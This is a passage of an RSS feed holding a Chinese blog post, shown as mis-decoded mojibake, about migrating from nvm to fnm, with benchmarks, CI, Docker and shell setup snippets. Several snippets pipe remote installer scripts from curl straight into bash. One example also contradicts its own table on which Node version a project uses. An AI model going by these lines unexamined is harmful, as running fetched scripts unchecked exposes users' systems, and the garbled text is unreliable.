<p><strong>Q3: å¦‚ä½•ä¿è¯æ”¶ç›Šï¼Ÿ</strong></p>
<p>ä»»åŠ¡æ˜ç æ ‡ä»·ï¼Œ<em>å¤šåŠ³å¤šå¾—</em>ï¼Œå¹³å°æä¾›æ¸…æ™°çš„è®¡ä»·è§„åˆ™å’Œç»“ç®—æµç¨‹ã€‚</p>
<p><strong>Q4: éç¨‹åºå‘˜å¯ä»¥å‚ä¸å—ï¼Ÿ</strong></p>
<p>å¯ä»¥ã€‚å¹³å°åŒæ—¶æä¾›éæŠ€æœ¯ç±»é¢˜ç›®ï¼Œæ¬¢è¿ <em>PMã€QA</em> ç­‰å²—ä½åŒå­¦å‚ä¸ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» nvm åˆ° fnmï¼šä¸€ä¸ªå‰ç«¯è€å…µçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·è¿ç§»å®å½•]]></title>    <link>https://juejin.cn/post/7581779319572873254</link>    <guid>https://juejin.cn/post/7581779319572873254</guid>    <pubDate>2025-12-10T03:54:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581779319572873254" data-draft-id="7581751726506049579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» nvm åˆ° fnmï¼šä¸€ä¸ªå‰ç«¯è€å…µçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·è¿ç§»å®å½•"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T03:54:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹¥å°˜çš„æŠ€æœ¯ä¹‹æ—…"/> <meta itemprop="url" content="https://juejin.cn/user/2700056286215032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» nvm åˆ° fnmï¼šä¸€ä¸ªå‰ç«¯è€å…µçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·è¿ç§»å®å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2700056286215032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹¥å°˜çš„æŠ€æœ¯ä¹‹æ—…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:54:20.000Z" title="Wed Dec 10 2025 03:54:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä» nvm åˆ° fnmï¼šä¸€ä¸ªå‰ç«¯è€å…µçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·è¿ç§»å®å½•</h2>
<h3 data-id="heading-1">å¼•å­ï¼šé‚£ä¸ªè®©æˆ‘å´©æºƒçš„æ—©æ™¨</h3>
<p>æŸä¸ªå‘¨ä¸€æ—©æ™¨ï¼Œæˆ‘åƒå¾€å¸¸ä¸€æ ·æ‰“å¼€ç»ˆç«¯å‡†å¤‡å¼€å§‹å·¥ä½œã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰“å¼€ iTerm2... ç­‰å¾…... ç­‰å¾…...</span>
<span class="hljs-comment"># ç»ˆäºå‡ºç°å‘½ä»¤æç¤ºç¬¦ï¼Œè€—æ—¶ 2.3 ç§’</span>
</code></pre>
<p>æ¥ç€åˆ‡æ¢åˆ°ä¸€ä¸ªéœ€è¦ Node 16 çš„è€é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ nvm use 16
Now using node v16.20.2 (npm v8.19.4)
<span class="hljs-comment"># åˆæ˜¯ 0.5 ç§’è¿‡å»äº†</span>
</code></pre>
<p>ç„¶åè·³åˆ°å¦ä¸€ä¸ª Node 20 çš„æ–°é¡¹ç›®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> ../new-project
$ nvm use 20
Now using node v20.19.6 (npm v10.8.2)
<span class="hljs-comment"># å†ç­‰ 0.5 ç§’</span>
</code></pre>
<p>ä¸€å¤©ä¸‹æ¥ï¼Œåœ¨ 5-6 ä¸ªé¡¹ç›®é—´æ¥å›åˆ‡æ¢ï¼Œå…‰æ˜¯ç­‰ nvm å“åº”å°±æµªè´¹äº†ä¸çŸ¥é“å¤šå°‘æ—¶é—´ã€‚æ›´åˆ«ææœ‰æ—¶å€™å¿˜è®° <code>nvm use</code>ï¼Œç›´æ¥ <code>npm install</code> å¯¼è‡´ node_modules ç‰ˆæœ¬æ··ä¹±çš„æƒ¨å‰§äº†ã€‚</p>
<p><strong>æ˜¯æ—¶å€™åšå‡ºæ”¹å˜äº†ã€‚</strong></p>
<h3 data-id="heading-2">ä¸ºä»€ä¹ˆè¦ç¦»å¼€ nvmï¼Ÿ</h3>
<h4 data-id="heading-3">ç—›ç‚¹ä¸€ï¼šShell å¯åŠ¨æ…¢å¾—ä»¤äººå‘æŒ‡</h4>
<p>nvm æ˜¯çº¯ Bash è„šæœ¬å®ç°çš„ã€‚æ¯æ¬¡æ‰“å¼€æ–°ç»ˆç«¯ï¼Œå®ƒéƒ½è¦ï¼š</p>
<ol>
<li>åŠ è½½ <code>nvm.sh</code> è„šæœ¬ï¼ˆå‡ åƒè¡Œï¼‰</li>
<li>è§£æå·²å®‰è£…çš„ Node ç‰ˆæœ¬</li>
<li>è®¾ç½®ç¯å¢ƒå˜é‡</li>
<li>åˆå§‹åŒ–è‡ªåŠ¨è¡¥å…¨</li>
</ol>
<p>æˆ‘ç”¨ <code>time</code> æµ‹äº†ä¸€ä¸‹æˆ‘çš„ <code>.zshrc</code> åŠ è½½æ—¶é—´ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æœ‰ nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.42s user 0.23s system 95% cpu 0.678 total

<span class="hljs-comment"># æ³¨é‡Šæ‰ nvm å</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.08s user 0.05s system 92% cpu 0.142 total
</code></pre>
<p><strong>nvm è®©æˆ‘çš„ç»ˆç«¯å¯åŠ¨æ…¢äº†è¿‘ 5 å€ï¼</strong></p>
<h4 data-id="heading-4">ç—›ç‚¹äºŒï¼šç‰ˆæœ¬åˆ‡æ¢ä¸å¤Ÿæ™ºèƒ½</h4>
<p>æ¯æ¬¡è¿›å…¥ä¸åŒé¡¹ç›®éƒ½è¦æ‰‹åŠ¨ <code>nvm use</code>ï¼Œå¤ªåŸå§‹äº†ã€‚è™½ç„¶æœ‰ <code>avn</code>ã€<code>nvm-auto</code> ç­‰æ’ä»¶å¯ä»¥å®ç°è‡ªåŠ¨åˆ‡æ¢ï¼Œä½†ï¼š</p>
<ul>
<li>åˆå¢åŠ äº†ä¸€å±‚ä¾èµ–</li>
<li>åˆæ‹–æ…¢äº† Shell é€Ÿåº¦</li>
<li>é…ç½®èµ·æ¥ä¹ŸæŒºéº»çƒ¦</li>
</ul>
<h4 data-id="heading-5">ç—›ç‚¹ä¸‰ï¼šWindows æ”¯æŒæ˜¯ä¸ªç¬‘è¯</h4>
<p>nvm å®˜æ–¹æ ¹æœ¬ä¸æ”¯æŒ Windowsã€‚<code>nvm-windows</code> æ˜¯å¦ä¸€ä¸ªç‹¬ç«‹é¡¹ç›®ï¼Œå‘½ä»¤å’Œè¡Œä¸ºéƒ½æœ‰å·®å¼‚ã€‚å›¢é˜Ÿé‡Œç”¨ Windows çš„åŒäº‹ç»å¸¸é‡åˆ°å„ç§å¥‡æ€ªé—®é¢˜ã€‚</p>
<h4 data-id="heading-6">ç—›ç‚¹å››ï¼šå¶å‘çš„è¯¡å¼‚ Bug</h4>
<p>ç”¨äº†å‡ å¹´ nvmï¼Œé‡åˆ°è¿‡å„ç§å¥‡æ€ªé—®é¢˜ï¼š</p>
<ul>
<li>å…¨å±€å®‰è£…çš„åŒ…è«åæ¶ˆå¤±</li>
<li><code>npm prefix</code> è·¯å¾„é”™ä¹±</li>
<li>å¤šä¸ªç»ˆç«¯çª—å£ç‰ˆæœ¬ä¸åŒæ­¥</li>
<li><code>.nvmrc</code> æœ‰æ—¶å€™ä¸ç”Ÿæ•ˆ</li>
</ul>
<h3 data-id="heading-7">é‡è§ fnmï¼šRust å¸¦æ¥çš„æ€§èƒ½é©å‘½</h3>
<p>fnmï¼ˆFast Node Managerï¼‰æ˜¯ç”¨ Rust å†™çš„ Node.js ç‰ˆæœ¬ç®¡ç†å™¨ã€‚ç¬¬ä¸€æ¬¡ç”¨çš„æ—¶å€™ï¼Œæˆ‘çš„ååº”æ˜¯ï¼š</p>
<blockquote>
<p>"å°±è¿™ï¼Ÿç»“æŸäº†ï¼Ÿæ€ä¹ˆè¿™ä¹ˆå¿«ï¼Ÿ"</p>
</blockquote>
<h4 data-id="heading-8">æ€§èƒ½å®æµ‹å¯¹æ¯”</h4>
<p>æˆ‘åœ¨è‡ªå·±çš„ M1 MacBook Pro ä¸Šåšäº†è¯¦ç»†æµ‹è¯•ï¼š</p>
<h5 data-id="heading-9">ç»ˆç«¯å¯åŠ¨æ—¶é—´</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.678 total

<span class="hljs-comment"># fnm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.089 total

<span class="hljs-comment"># æå‡ï¼š7.6 å€</span>
</code></pre>
<h5 data-id="heading-10">ç‰ˆæœ¬åˆ‡æ¢æ—¶é—´</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time nvm use 20
Now using node v20.19.6
real    0m0.347s

<span class="hljs-comment"># fnm</span>
$ time fnm use 20
Using Node v20.19.6
real    0m0.012s

<span class="hljs-comment"># æå‡ï¼š29 å€</span>
</code></pre>
<h5 data-id="heading-11">å®‰è£…æ–°ç‰ˆæœ¬</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm install 22</span>
<span class="hljs-comment"># æ€»è€—æ—¶çº¦ 45 ç§’ï¼ˆåŒ…å«ä¸‹è½½ï¼‰</span>

<span class="hljs-comment"># fnm install 22</span>
<span class="hljs-comment"># æ€»è€—æ—¶çº¦ 38 ç§’ï¼ˆåŒ…å«ä¸‹è½½ï¼‰</span>

<span class="hljs-comment"># ä¸‹è½½é€Ÿåº¦å·®ä¸å¤šï¼Œä½† fnm çš„è§£å‹å’Œé…ç½®æ›´å¿«</span>
</code></pre>
<h4 data-id="heading-12">ä¸ºä»€ä¹ˆ fnm è¿™ä¹ˆå¿«ï¼Ÿ</h4>
<ol>
<li><strong>åŸç”ŸäºŒè¿›åˆ¶</strong>ï¼šRust ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¸éœ€è¦è§£é‡Šå™¨</li>
<li><strong>å¹¶è¡Œå¤„ç†</strong>ï¼šå……åˆ†åˆ©ç”¨å¤šæ ¸ CPU</li>
<li><strong>æƒ°æ€§åŠ è½½</strong>ï¼šåªåœ¨éœ€è¦æ—¶æ‰è¯»å–ç‰ˆæœ¬ä¿¡æ¯</li>
<li><strong>é«˜æ•ˆçš„æ–‡ä»¶æ“ä½œ</strong>ï¼šRust çš„ I/O æ€§èƒ½æœ¬å°±å‡ºè‰²</li>
</ol>
<h3 data-id="heading-13">çœŸå®åœºæ™¯ï¼šfnm å¦‚ä½•æ”¹å˜æˆ‘çš„å·¥ä½œæµ</h3>
<h4 data-id="heading-14">åœºæ™¯ä¸€ï¼šå¤šé¡¹ç›®å¹¶è¡Œå¼€å‘</h4>
<p>æˆ‘åŒæ—¶ç»´æŠ¤ç€è¿™äº›é¡¹ç›®ï¼š</p>



































<table><thead><tr><th>é¡¹ç›®</th><th>Node ç‰ˆæœ¬</th><th>åŸå› </th></tr></thead><tbody><tr><td>è€åå°ç³»ç»Ÿ</td><td>14</td><td>å†å²åŒ…è¢±ï¼Œä¾èµ–ä¸æ”¯æŒé«˜ç‰ˆæœ¬</td></tr><tr><td>ä¸»ç«™å‰ç«¯</td><td>18</td><td>ç¨³å®šçš„ LTS</td></tr><tr><td>æ–°ç®¡ç†åå°</td><td>20</td><td>éœ€è¦æ–°ç‰¹æ€§</td></tr><tr><td>å®éªŒæ€§é¡¹ç›®</td><td>22</td><td>å°é²œæœ€æ–° API</td></tr><tr><td>Electron åº”ç”¨</td><td>18</td><td>Electron ç‰ˆæœ¬é™åˆ¶</td></tr></tbody></table>
<p><strong>ä»¥å‰ç”¨ nvmï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
$ nvm use  <span class="hljs-comment"># ç­‰å¾…...</span>
Found <span class="hljs-string">'/Users/me/legacy-admin/.nvmrc'</span> with version &lt;14&gt;
Now using node v14.21.3

$ <span class="hljs-built_in">cd</span> ../main-site
$ nvm use  <span class="hljs-comment"># åˆç­‰å¾…...</span>
Found <span class="hljs-string">'/Users/me/main-site/.nvmrc'</span> with version &lt;18&gt;
Now using node v18.20.8

<span class="hljs-comment"># ç»å¸¸å¿˜è®° nvm useï¼Œç„¶å...</span>
$ npm install
<span class="hljs-comment"># è£…äº†ä¸€å †é”™è¯¯ç‰ˆæœ¬çš„ä¾èµ– ğŸ’¥</span>
</code></pre>
<p><strong>ç°åœ¨ç”¨ fnmï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
Using Node v14.21.3  <span class="hljs-comment"># è‡ªåŠ¨åˆ‡æ¢ï¼Œç¬é—´å®Œæˆ</span>

$ <span class="hljs-built_in">cd</span> ../main-site
Using Node v20.19.6  <span class="hljs-comment"># æ— æ„Ÿåˆ‡æ¢</span>

<span class="hljs-comment"># æ°¸è¿œä¸ä¼šå¿˜è®°åˆ‡æ¢ç‰ˆæœ¬ï¼Œå› ä¸ºæ˜¯è‡ªåŠ¨çš„</span>
</code></pre>
<h4 data-id="heading-15">åœºæ™¯äºŒï¼šCI/CD ç¯å¢ƒç»Ÿä¸€</h4>
<p>æˆ‘ä»¬å›¢é˜Ÿçš„ CI é…ç½®ä»¥å‰æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (ä½¿ç”¨ nvm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-o-</span> <span class="hljs-string">https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">NVM_DIR="$HOME/.nvm"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">.</span> <span class="hljs-string">"$NVM_DIR/nvm.sh"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">use</span>
</code></pre>
<p>æ¢æˆ fnm åï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (ä½¿ç”¨ fnm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-fsSL</span> <span class="hljs-string">https://fnm.vercel.app/install</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">eval</span> <span class="hljs-string">"$(fnm env)"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">use</span>
</code></pre>
<p><strong>CI æ„å»ºæ—¶é—´å‡å°‘äº†çº¦ 15 ç§’</strong>ï¼ˆä¸»è¦æ˜¯ nvm åˆå§‹åŒ–å¤ªæ…¢ï¼‰ã€‚</p>
<h4 data-id="heading-16">åœºæ™¯ä¸‰ï¼šå›¢é˜Ÿåä½œä¸è·¨å¹³å°</h4>
<p>æˆ‘ä»¬å›¢é˜Ÿæˆå‘˜ä½¿ç”¨çš„ç³»ç»Ÿï¼š</p>
<ul>
<li>60% macOS</li>
<li>30% Windows</li>
<li>10% Linux</li>
</ul>
<p><strong>nvm æ—¶ä»£çš„ç—›è‹¦ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS/Linux åŒäº‹</span>
$ nvm use 20

<span class="hljs-comment"># Windows åŒäº‹ï¼ˆnvm-windowsï¼‰</span>
$ nvm use 20.19.6  <span class="hljs-comment"># å¿…é¡»å†™å®Œæ•´ç‰ˆæœ¬å·ï¼</span>
<span class="hljs-comment"># è€Œä¸” .nvmrc ç»å¸¸ä¸ç”Ÿæ•ˆ</span>
</code></pre>
<p><strong>fnm æ—¶ä»£çš„ç»Ÿä¸€ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ‰€æœ‰å¹³å°ï¼Œç›¸åŒå‘½ä»¤ï¼Œç›¸åŒè¡Œä¸º</span>
$ fnm use 20
</code></pre>
<p>Windows åŒäº‹ç»ˆäºä¸ç”¨å•ç‹¬ç»´æŠ¤ä¸€å¥—æ–‡æ¡£äº†ã€‚</p>
<h4 data-id="heading-17">åœºæ™¯å››ï¼šDocker å¼€å‘ç¯å¢ƒ</h4>
<p>åœ¨ Dockerfile ä¸­å®‰è£… Nodeï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># ä»¥å‰ç”¨ nvmï¼ˆä¸æ¨èï¼Œä½†æœ‰äººè¿™ä¹ˆå¹²ï¼‰
RUN curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash \
    &amp;&amp; . ~/.nvm/nvm.sh \
    &amp;&amp; nvm install 20 \
    &amp;&amp; nvm alias default 20
# é•œåƒä½“ç§¯å¤§ï¼Œå±‚æ•°å¤š

# ç°åœ¨ç”¨ fnm
RUN curl -fsSL https://fnm.vercel.app/install | bash -s -- --install-dir /usr/local/bin \
    &amp;&amp; fnm install 20 \
    &amp;&amp; fnm default 20
# æ›´ç®€æ´ï¼Œä½“ç§¯æ›´å°
</code></pre>
<h4 data-id="heading-18">åœºæ™¯äº”ï¼šMonorepo ä¸­çš„å¤šç‰ˆæœ¬éœ€æ±‚</h4>
<p>æˆ‘ä»¬æœ‰ä¸€ä¸ª Monorepoï¼Œä¸åŒ package éœ€è¦ä¸åŒ Node ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">monorepo/
â”œâ”€â”€ packages/
â”‚   â”œâ”€â”€ legacy-sdk/        <span class="hljs-comment"># éœ€è¦ Node 14ï¼ˆå…¼å®¹è€ç”¨æˆ·ï¼‰</span>
â”‚   â”‚   â””â”€â”€ .node-version  <span class="hljs-comment"># 14</span>
â”‚   â”œâ”€â”€ web-app/           <span class="hljs-comment"># éœ€è¦ Node 20</span>
â”‚   â”‚   â””â”€â”€ .node-version  <span class="hljs-comment"># 20</span>
â”‚   â””â”€â”€ cli-tool/          <span class="hljs-comment"># éœ€è¦ Node 18</span>
â”‚       â””â”€â”€ .node-version  <span class="hljs-comment"># 18</span>
â””â”€â”€ .node-version          <span class="hljs-comment"># 20ï¼ˆé»˜è®¤ï¼‰</span>
</code></pre>
<p>fnm çš„ <code>--use-on-cd</code> è®©æˆ‘åœ¨ä¸åŒ package é—´è·³è½¬æ—¶å®Œå…¨æ— æ„Ÿï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> packages/legacy-sdk
Using Node v14.21.3

$ <span class="hljs-built_in">cd</span> ../web-app
Using Node v20.19.6

$ <span class="hljs-built_in">cd</span> ../cli-tool
Using Node v18.20.8
</code></pre>
<h3 data-id="heading-19">å®Œæ•´è¿ç§»æŒ‡å—</h3>
<h4 data-id="heading-20">ç¬¬ä¸€æ­¥ï¼šå®‰è£… fnm</h4>
<p><strong>macOS (Homebrew):</strong></p>
<pre><code class="hljs language-bash" lang="bash">brew install fnm
</code></pre>
<p><strong>Windows (Scoop):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">scoop install fnm
</code></pre>
<p><strong>Windows (Chocolatey):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">choco install fnm
</code></pre>
<p><strong>Linux/macOS (curl):</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://fnm.vercel.app/install | bash
</code></pre>
<p><strong>Cargo (Rust ç”¨æˆ·):</strong></p>
<pre><code class="hljs language-bash" lang="bash">cargo install fnm
</code></pre>
<h4 data-id="heading-21">ç¬¬äºŒæ­¥ï¼šé…ç½® Shell</h4>
<p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œé…ç½®æ­£ç¡®æ‰èƒ½äº«å—è‡ªåŠ¨åˆ‡æ¢çš„ä¾¿åˆ©ã€‚</p>
<p><strong>Zsh (~/.zshrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell zsh)</span>"</span>
</code></pre>
<p><strong>Bash (~/.bashrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell bash)</span>"</span>
</code></pre>
<p><strong>Fish (~/.config/fish/config.fish):</strong></p>
<pre><code class="hljs language-fish" lang="fish"># fnm - Fast Node Manager
fnm env --use-on-cd --shell fish | source
</code></pre>
<p><strong>PowerShell ($PROFILE):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># fnm - Fast Node Manager
fnm env --use-on-cd --shell powershell | Out-String | Invoke-Expression
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>--use-on-cd</code></td><td>è¿›å…¥ç›®å½•æ—¶è‡ªåŠ¨è¯»å– <code>.node-version</code> æˆ– <code>.nvmrc</code> å¹¶åˆ‡æ¢</td></tr><tr><td><code>--shell &lt;shell&gt;</code></td><td>æŒ‡å®š Shell ç±»å‹ï¼Œç”Ÿæˆå¯¹åº”çš„ç¯å¢ƒå˜é‡è®¾ç½®å‘½ä»¤</td></tr><tr><td><code>--version-file-strategy recursive</code></td><td>å‘ä¸Šé€’å½’æŸ¥æ‰¾ç‰ˆæœ¬æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰</td></tr><tr><td><code>--corepack-enabled</code></td><td>è‡ªåŠ¨å¯ç”¨ Corepackï¼ˆå¯é€‰ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-22">ç¬¬ä¸‰æ­¥ï¼šè¿ç§»å·²å®‰è£…çš„ Node ç‰ˆæœ¬</h4>
<p>æŸ¥çœ‹ nvm å®‰è£…äº†å“ªäº›ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span> ~/.nvm/versions/node/
<span class="hljs-comment"># v10.24.1 v14.21.3 v16.20.2 v18.20.8 v20.19.6 v22.21.0</span>
</code></pre>
<p>åœ¨ fnm ä¸­å®‰è£…å¯¹åº”ç‰ˆæœ¬ï¼š</p>
